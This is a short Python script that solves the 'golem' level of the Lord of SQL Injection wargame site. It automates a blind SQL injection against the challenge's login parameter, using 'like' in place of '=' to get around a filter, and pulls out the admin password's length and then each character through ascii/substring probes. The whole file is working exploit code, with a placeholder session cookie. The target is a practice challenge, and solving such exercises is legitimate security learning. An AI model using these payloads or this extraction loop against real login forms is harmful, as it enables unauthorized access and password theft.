import requests

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
cookies = { "PHPSESSID" : "쿠키값" }

def pw_length():
    length = 1

    while True:
        params = { "pw" : "' || id like 'admin' && length(pw) like {} #".format(length) }
        request = requests.get(url, params=params, cookies=cookies)

        if "Hello admin" in request.text:
            return length
        else:
            length += 1

def pw_crack():
    password_length = pw_length()
    password = ''

    for i in range(1, password_length+1):
        for j in range(30, 123):
            params = { "pw" : "' || id like 'admin' && ascii(substring(pw, {}, 1)) like {} #".format(i, j) }
            request = requests.get(url, params=params, cookies=cookies)

            if "Hello admin" in request.text:
                password = password + chr(j)
                print("패스워드:", password)
                if len(password) == 8:
                    break

pw_crack()
